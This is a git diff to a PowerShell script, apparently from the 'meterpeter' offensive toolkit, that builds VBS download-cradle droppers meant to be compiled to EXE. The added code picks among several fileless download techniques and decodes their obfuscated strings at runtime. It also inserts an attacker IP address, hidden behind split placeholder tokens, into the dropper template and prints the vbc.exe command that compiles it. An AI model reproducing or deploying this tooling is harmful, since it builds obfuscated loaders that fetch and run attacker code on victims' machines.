@@ -163,11 +163,10 @@ If($Egg -ieq "false")
    $LastRanges = "$TrithRange" + ":" + "$HttpServerPort" -join ''         #.72:8087 - NAVIGATOR
 
    #Dispaly OnScreen ( CmdLet Manul execution )
-   write-host "`n*" -ForegroundColor Green -NoNewline;
-   write-host " Creating '" -ForegroundColor DarkGray -NoNewline;
-   write-host "$VbsName" -ForegroundColor Green -NoNewline;
-   write-host "'" -ForegroundColor DarkGray -NoNewline;
-   write-host ".[$Action]" -ForegroundColor DarkGray; 
+   write-host "`n*" -ForegroundColor Green -NoNewline
+   write-host " Creating '" -ForegroundColor DarkGray -NoNewline
+   write-host "$VbsName" -ForegroundColor Green -NoNewline
+   write-host "' [$Action]" -ForegroundColor DarkGray 
 }
 
 ## List Of Download Crandle Technics ( download crandles - download \ fileless )
@@ -407,12 +406,32 @@ ElseIf($Action -ieq "Compile")
    Helper - Creates VBS that can be compiled to EXE later
 
 .NOTES
-   This vbs only uses fileless technic n2
+   This vbs only uses fileless technic n3
 #>
 
 
 #Deobfuscating strings ( download technics ) at runtime
-$CrandleCmdLine = $TechnicFileLessTwo -replace '@!','w' -replace '#','e' -replace '&%','s'
+If($Technic -ieq "two" -or $Technic -eq 2)
+{
+   #Deobfuscating strings ( download technics ) at runtime
+   $CrandleCmdLine = $TechnicFileLessTwo -replace '@!','w' -replace '#','e' -replace '&%','s'
+}
+ElseIf($Technic -ieq "three" -or $Technic -eq 3)
+{
+   #Deobfuscating strings ( download technics ) at runtime
+   $CrandleCmdLine = $TechnicFileLessTre -replace '@!','w' -replace '#','e' -replace '&%','s'
+}
+ElseIf($Technic -ieq "four" -or $Technic -eq 4)
+{
+   #Deobfuscating strings ( download technics ) at runtime
+   $CrandleCmdLine = $TechnicFileLessXml -replace '@!','w' -replace '#','e' -replace '&%','s'
+}
+Else
+{
+   #Deobfuscating strings ( download technics ) at runtime
+   $CrandleCmdLine = $TechnicFileLessOne -replace '@!','w' -replace '#','e' -replace '&%','s'
+}
+
 
 $VBStoExe = @("Imports System
 Imports System.Runtime.InteropServices
@@ -436,6 +455,25 @@ End Module")
 
    #Build crandle VBS that meterpeter compiles it to EXE
    echo $VBStoExe|Out-File "$VbsName" -Encoding string -Force
+
+   If($Egg -ieq "false")
+   {
+      ## Replace the attacker ip addr (obfus`cated\split) on vbs template
+      ((Get-Content -Path "$VbsName" -Raw) -Replace "VIRIATO","$SeconRange")|Set-Content -Path "$VbsName"
+      ((Get-Content -Path "$VbsName" -Raw) -Replace "COLOMBO","$FirstRange")|Set-Content -Path "$VbsName"
+      ((Get-Content -Path "$VbsName" -Raw) -Replace "NAVIGATOR","$trithRange")|Set-Content -Path "$VbsName"
+
+      ## Print OnScreen
+      write-host "*" -ForegroundColor Green -NoNewline
+      write-host " Storage: " -NoNewline
+      write-host "$pwd\${VbsName}" -ForegroundColor Green
+
+      write-host "*" -ForegroundColor Green -NoNewline
+      write-host " Compile: " -NoNewline
+      $CrandleExeName = $VbsName -replace '.vbs','.exe'
+      write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe /nologo /quiet /target:exe /out:`"$pwd\${CrandleExeName}`" `"$pwd\$VbsName`" /platform:anyCPU`n" -ForegroundColor DarkYellow
+   }
+
    Exit
 }
 Else
